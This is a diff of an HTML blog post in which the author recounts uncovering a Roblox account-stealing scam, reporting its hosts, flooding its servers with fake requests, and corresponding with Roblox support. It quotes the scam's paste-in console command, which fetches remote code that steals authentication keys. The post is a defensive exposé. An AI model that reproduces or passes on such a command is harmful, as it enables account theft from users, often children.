@@ -8,107 +8,132 @@
 			font-family: sans-serif;
 			color: white;
 			background-color: #2d2e2e;
+			font-size: large;
 		}
-
-		a {color: #88c3bb;}
-		a:visited {color: #547b76;}
-
+		a {color: lightblue;}
+		a:visited {color: #719aa6;}
 		.post {
 			background-color: #474747;
-			padding: 5px 5px;
-			margin-bottom: 20px;
-			width: 70%;
+			max-width: 900px;
 			margin: auto;
 			margin-bottom: 20px;
+			padding: 10px;
 		}
 		.post h1 { margin: 0px; }
-
-		@media only screen and (max-width: 600px) {
-			.post {
-				width: 100%;
-			}
-			
-			.ad {
-				width: 100%;
-			}
-		}
-
 		.header {
 			text-align: center;
 			margin-bottom: 10px;
 		}
-		
 		.center {
 		    text-align: center;
 		}
-
 		.header h1 {
 			margin-bottom: 0px;
 		}
-
 		code {
+			display: inline-block;
 			background: #0b140b;
 			margin: 2px;
-			overflow-x: scroll;
-			padding: 3px;
+			padding: 2px;
 			white-space: break-spaces;
 		}
-
-		.long {
-			display: block;
-			padding: 10px;
-			margin: 10px;
-		}
-		
 		.back {
 			display: block;
 			width: 50px;
 			margin: auto;
 		}
+/*		img {
+			max-height: 300px;
+			vertical-align: top;
+		}*/
 	</style>
 </head>
 <body>
 	<div class="header">
-		<a href="."><h1>Daniel's Stuff</h1></a>
+		<a href="."><h1>Daniel&#039;s stuff</h1></a>
 		<a href="rss.xml">RSS</a><br>
-		<div class="ad" id="amzn-assoc-ad-94172efa-e524-41ae-b714-e1722b66759e"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&adInstanceId=94172efa-e524-41ae-b714-e1722b66759e"></script>
 	</div>
-	<div class='post' title='Post #27'><h1>Dismantling a Roblox Scam</h1><p>September 21, 2020</p><i>James 3:16: For where jealousy and selfish ambition exist, there will be disorder and every vile practice.</i>
+	<div class='post' title='Post #27'><h1>Dismantling a Roblox Scam</h1><p>September 21, 2020</p><p><em>James 3:16: For where jealousy and selfish ambition exist, there will be disorder and every vile practice.</em></p>
 <hr>
-On January 28th, 2020, I decided to visit Roblox to check up on things a bit. I am almost never active there, and only log in every month or so. I noticed that I was sent a message by a Roblox friend, asking me a harmless question.<br><br><code class='long'>hi dude
-i&#x27;m making a game and I wanna put your roblox character into it
+<p>On January 28th, 2020, I decided to visit Roblox to check up on things a bit. I am almost never active there, and only log in every month or so. I noticed that I was sent a message by a Roblox friend, asking me a harmless question.</p>
+<pre><code>hi dude
+i'm making a game and I wanna put your roblox character into it
 could you upload your roblox char texture as a decal and send the link to me
-here&#x27;s a tutorial on how to do it if you don&#x27;t already know:
-</code><br><br>They linked me to a Youtube tutorial, and I was instantly suspicious of a scam. On the Youtube video, I was prompted to run this javascript in my browser:<br><br><code>$.get(&#x27;//rblx.link&#x27;)</code><br><br>&quot;rblx.link&quot; runs remote code from a third party website. That code gets your Roblox authentication key and sends it to their server, and then sends you to the profile texture as expected.
+here's a tutorial on how to do it if you don't already know:
+</code></pre>
+<p>They linked me to a Youtube tutorial, and I was instantly suspicious of a scam. On the Youtube video, I was prompted to run this javascript in my browser:</p>
+<p><code>$.get('//rblx.link')</code></p>
+<p>"rblx.link" runs remote code from a third party website. That code gets your Roblox authentication key and sends it to their server, and then sends you to the profile texture as expected.
 When I clicked on my friends profile, they were wearing red and blue
-Roblox clothes, and the description was changed to:<br><br>Ask your parents to vote for Trump this year!
-#MAGA2020<br><br>They had messed with the wrong person, and were going to pay.<br><br>
-I spent a few days studying the the fraud, and came up with a clear and explanation of the process:<br><br>It mainly started with a data breach, in which the scammer took advantage of and infected. When an account is hacked, their Robux is stolen, and account is filled with Trump propaganda. They the system messages all their friends, sending the same
-message, therefore, the number of hacked accounts grows exponentially.<br><br>I tracked the fraud site&#x27;s hosting provider to DigitalOcean, so I reported it
-and they quickly removed it, effectively shutting it down.<br><br><b>That lasted 5 hours.</b><br><br>After their host was down, they quickly relocated to a lesser-known Netherlands based host and changed the description of the video to a new port on the same domain. I then returned by reporting the abusive website to the new host. They didn&#x27;t respond.<br><br>In an effort to try and slow down the efficiency of the system, I wrote a script to generate fake requests and send them to the server. This will confuse the real and fake requests, therefore drastically slowing down the breaking-into-accounts process.
+Roblox clothes, and the description was changed to:</p>
+<p>Ask your parents to vote for Trump this year!</p>
+<h1>MAGA2020</h1>
+<p>They had messed with the wrong person, and were going to pay.</p>
+<p>I spent a few days studying the the fraud, and came up with a clear and explanation of the process:</p>
+<p>It mainly started with a data breach, in which the scammer took advantage of and infected. When an account is hacked, their Robux is stolen, and account is filled with Trump propaganda. They the system messages all their friends, sending the same
+message, therefore, the number of hacked accounts grows exponentially.</p>
+<p>I tracked the fraud site's hosting provider to DigitalOcean, so I reported it
+and they quickly removed it, effectively shutting it down.</p>
+<p><strong>That lasted 5 hours.</strong></p>
+<p>After their host was down, they quickly relocated to a lesser-known Netherlands based host and changed the description of the video to a new port on the same domain. I then returned by reporting the abusive website to the new host. They didn't respond.</p>
+<p>In an effort to try and slow down the efficiency of the system, I wrote a script to generate fake requests and send them to the server. This will confuse the real and fake requests, therefore drastically slowing down the breaking-into-accounts process.
 I proceeded to send hundreds, and sometimes thousands of fake requests over a period of a few days.
-Although this was very effective, some websites only allowed 1 visit per IP address. I could just renew Tor sessions, but it wasn&#x27;t nearly as effective.<br><br><h2>Who&#x27;s Affected?</h2>
-While this was running, I started to do some research on other people’s experiences with the scam.<br><br>After searching more, I figured out it wasn&#x27;t just one site, but many, although
+Although this was very effective, some websites only allowed 1 visit per IP address. I could just renew Tor sessions, but it wasn't nearly as effective.</p>
+<h2>Who's Affected?</h2>
+<p>While this was running, I started to do some research on other people’s experiences with the scam.</p>
+<p>After searching more, I figured out it wasn't just one site, but many, although
 the Trump propaganda accounts seem to be the most popular. Simply looking though
 Youtube shows that many people have been setting up servers to steal accounts in
-the exact same way the Trump one was. There are even tutorials on Youtube showing you how to set it up, and showing behind the scenes on how it works.<br><br>I went through as many scam sites as I could. One even send the executable JavaScript encoded in JSFuck.<br><br>I modified my script to be interchangeable between as many fraud sites as I could find, and started spamming again. At the time, this was very secret. I didn&#x27;t want anybody to be able to find the weaknesses of all the scams.<br><br><h2>A Conclusion</h2>
-<b>&quot;Robux&quot; is the problem with Roblox.</b> 
-More specifically, getting children to join a community based on a digital currency is a bad idea. Sure, it brings people together, you can make friends. The idea sounds fun in theory, but is unavoidably very problematic in practice. What is even more of a bad idea is having the ability to exchange Robux for real life currency. This is what lets adults be able to take advantage of the platform.<br><br><b>Kids want free Robux.</b>
-They will do anything and everything to obtain it. The people on the other end, do everything they possibly can to make their &quot;Robux generators&quot; look legit. This includes things like adding fake chat rooms, fake recent activity, and even hosting PDF files on local government websites.<br><br>And it works.<br><br>I’m not trying to blame scams entirely on Roblox’s design. Simply put, when you add digital currency into a game, it becomes more about the currency and not the game itself.<br><br><h2>Contacting Roblox</h2>
-As my motivation to kill off Roblox scams dies off, I decided to send some emails
-to the Roblox team. Their replies seemed to be written very quickly, and more importantly, it doesn&#x27;t look like they passed it to the Roblox security team.<br><br>Here is one of the emails I sent them:<br><br><code class='long'>As the scam takes over many accounts, banning each one will not be effective,
-especially since they were hacked into in the first place.<br><br>I meant not a popup message on the main page, but a message to their inbox,
-the same place where you get messages on the latest &quot;Wonder Woman Items&quot;. It would greatly increase awareness about the current situation, and help the Roblox community to continue to be a safe place.<br><br>Also, it is strange that Youtube links are able to be sent and can pass
+the exact same way the Trump one was. There are even tutorials on Youtube showing you how to set it up, and showing behind the scenes on how it works.</p>
+<p>I went through as many scam sites as I could. One even send the executable JavaScript encoded in JSFuck.</p>
+<p>I modified my script to be interchangeable between as many fraud sites as I could find, and started spamming again. At the time, this was very secret. I didn't want anybody to be able to find the weaknesses of all the scams.</p>
+<h2>A Conclusion</h2>
+<p><strong>"Robux" is the problem with Roblox.</strong> 
+More specifically, getting children to join a community based on a digital currency is a bad idea. Sure, it brings people together, you can make friends. The idea sounds fun in theory, but is unavoidably very problematic in practice. What is even more of a bad idea is having the ability to exchange Robux for real life currency. This is what lets adults be able to take advantage of the platform.</p>
+<p><strong>Kids want free Robux.</strong>
+They will do anything and everything to obtain it. The people on the other end, do everything they possibly can to make their "Robux generators" look legit. This includes things like adding fake chat rooms, fake recent activity, and even hosting PDF files on local government websites.</p>
+<p>And it works.</p>
+<p>I’m not trying to blame scams entirely on Roblox’s design. Simply put, when you add digital currency into a game, it becomes more about the currency and not the game itself.</p>
+<h2>Contacting Roblox</h2>
+<p>As my motivation to kill off Roblox scams dies off, I decided to send some emails
+to the Roblox team. Their replies seemed to be written very quickly, and more importantly, it doesn't look like they passed it to the Roblox security team.</p>
+<p>Here is one of the emails I sent them:</p>
+<pre><code>As the scam takes over many accounts, banning each one will not be effective,
+especially since they were hacked into in the first place.
+
+I meant not a popup message on the main page, but a message to their inbox,
+the same place where you get messages on the latest &quot;Wonder Woman Items&quot;. It would greatly increase awareness about the current situation, and help the Roblox community to continue to be a safe place.
+
+Also, it is strange that Youtube links are able to be sent and can pass
 through your messaging system, assuming it was not already fixed.
-</code><br><br>And they responded:<br><br><code class='long'>Hello Dan,<br><br>Thank you for your reply.<br><br>Although we may not be able to follow-up further, we do value and use player ideas and suggestions to bring new features and awareness to Roblox.<br><br>We would also like to inform you that once you use the &#x27;Report Abuse&#x27; option a ticket is generated and may take a few minutes to reach one of our live moderation agents. ROBLOX moderators are a team of employees who work diligently around the clock to review and apply appropriate consequences when necessary.<br><br>Please note that just because you have reported someone does not mean our team will immediately remove the player from the website for days at a time. We have a procedure that we follow for every user on the website and for every situation. You may not know what type and length of moderation another user&#x27;s account will receive, as it is private but all accounts caught violating ROBLOX rules will be moderated.<br><br>The important part here to understand is that privacy rules do not permit us to share moderation actions taken against other accounts, but all accounts caught violating ROBLOX rules will be moderated.<br><br>Therefore, you will never know if the action was actually taken, rest assured, we always take action according to the nature of the violation.<br><br>If you need help with something else, please let us know here.<br><br>Sincerely,
+</code></pre>
+<p>And they responded:</p>
+<pre><code>Hello Dan,
+
+Thank you for your reply.
+
+Although we may not be able to follow-up further, we do value and use player ideas and suggestions to bring new features and awareness to Roblox.
+
+We would also like to inform you that once you use the 'Report Abuse' option a ticket is generated and may take a few minutes to reach one of our live moderation agents. ROBLOX moderators are a team of employees who work diligently around the clock to review and apply appropriate consequences when necessary.
+
+Please note that just because you have reported someone does not mean our team will immediately remove the player from the website for days at a time. We have a procedure that we follow for every user on the website and for every situation. You may not know what type and length of moderation another user's account will receive, as it is private but all accounts caught violating ROBLOX rules will be moderated.
+
+The important part here to understand is that privacy rules do not permit us to share moderation actions taken against other accounts, but all accounts caught violating ROBLOX rules will be moderated.
+
+Therefore, you will never know if the action was actually taken, rest assured, we always take action according to the nature of the violation.
+
+If you need help with something else, please let us know here.
+
+Sincerely,
 Simon
-</code><br><br>The response was most likely generated.
-Although in the first email, one line seemed to be unique.
-<code class='long'>We appreciate you taking the time to write in with your feedback for Roblox and want to confirm that your suggestion regarding the issuing a warning message to the users regarding this propaganda has been received.
-</code>
-This means they are completely fine with sending messages encouraging children to purchase Robux, but they can’t send a warning about a fraud destroying their community?<br><br>I guess we&#x27;ll never know...<br><br>Further reading:
-<a href='https://www.androidauthority.com/in-app-purchases-good-bad-ugly-truth-324604/'>https://www.androidauthority.com/in-app-purchases-good-bad-ugly-truth-324604/</a>
-</div><a class='back' href='.'>Back</a>
-	<p style='text-align: center;'>Contact me:<br><img src='../images/email.png'></p>
+</code></pre>
+<p>The response was most likely generated.
+Although in the first email, one line seemed to be unique.</p>
+<pre><code>We appreciate you taking the time to write in with your feedback for Roblox and want to confirm that your suggestion regarding the issuing a warning message to the users regarding this propaganda has been received.
+</code></pre>
+<p>This means they are completely fine with sending messages encouraging children to purchase Robux, but they can’t send a warning about a fraud destroying their community?</p>
+<p>I guess we'll never know...</p>
+<p>Further reading:
+<a href="https://www.androidauthority.com/in-app-purchases-good-bad-ugly-truth-324604/">https://www.androidauthority.com/in-app-purchases-good-bad-ugly-truth-324604/</a></p></div><a class='back' href='.'>Back</a>
 </body>
 </html>
